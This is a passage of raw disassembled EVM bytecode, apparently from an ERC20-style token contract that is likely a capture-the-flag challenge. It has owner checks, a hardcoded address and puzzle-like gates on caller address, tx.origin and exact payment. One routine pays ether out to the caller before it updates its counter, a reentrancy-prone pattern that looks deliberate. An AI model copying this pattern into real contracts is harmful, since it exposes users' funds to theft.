0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x148D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1462 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x148D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1470 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xA PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1588 CALLER DUP5 PUSH2 0x1583 DUP6 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x262E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x15A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0x220866B1A2219F40E72F5C628B65D54268CA3A9D PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1717 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1750 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD EQ PUSH2 0x179C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD EQ PUSH2 0x17E8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 CALLVALUE EQ PUSH2 0x17F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x64 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1893 CALLER DUP5 DUP5 PUSH2 0x23D5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1986 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0xA PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1AAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x64 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO PUSH2 0x1AF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x1B83 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH32 0xC6CA6DD98A4B886A6583C4FE06CA48539C1B02895EDE06BE528C33B60F917B98 PUSH1 0x1 PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xC8 DUP3 LT ISZERO PUSH2 0x1C5E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFFFF DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND AND EQ PUSH2 0x1C84 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD GT PUSH2 0x1CD0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 PUSH1 0x2 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO PUSH2 0x1D1C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 SELFBALANCE LT ISZERO PUSH2 0x1D29 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0xF4240 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D8B JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D90 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0x1D9E CALLER ADDRESS DUP5 PUSH2 0x23D5 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1EB7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x1F3D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2740 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x20BD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x2264 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2788 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x22EA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2766 PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x2427 DUP2 PUSH1 0x2 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x262E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x24BC DUP2 PUSH1 0x2 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x26B7 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x2508 DUP3 PUSH2 0x1497 JUMP JUMPDEST PUSH2 0x25C4 JUMPI PUSH1 0xB SLOAD PUSH1 0x2 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD GT ISZERO PUSH2 0x25C3 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xD DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x686F6C64206F766572666C6F7700000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0x26A6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 DUP5 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x2735 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID 0x4F PUSH24 0x6E61626C653A206E6577206F776E65722069732074686520 PUSH27 0x65726F206164647265737345524332303A20617070726F76652074 PUSH16 0x20746865207A65726F20616464726573 PUSH20 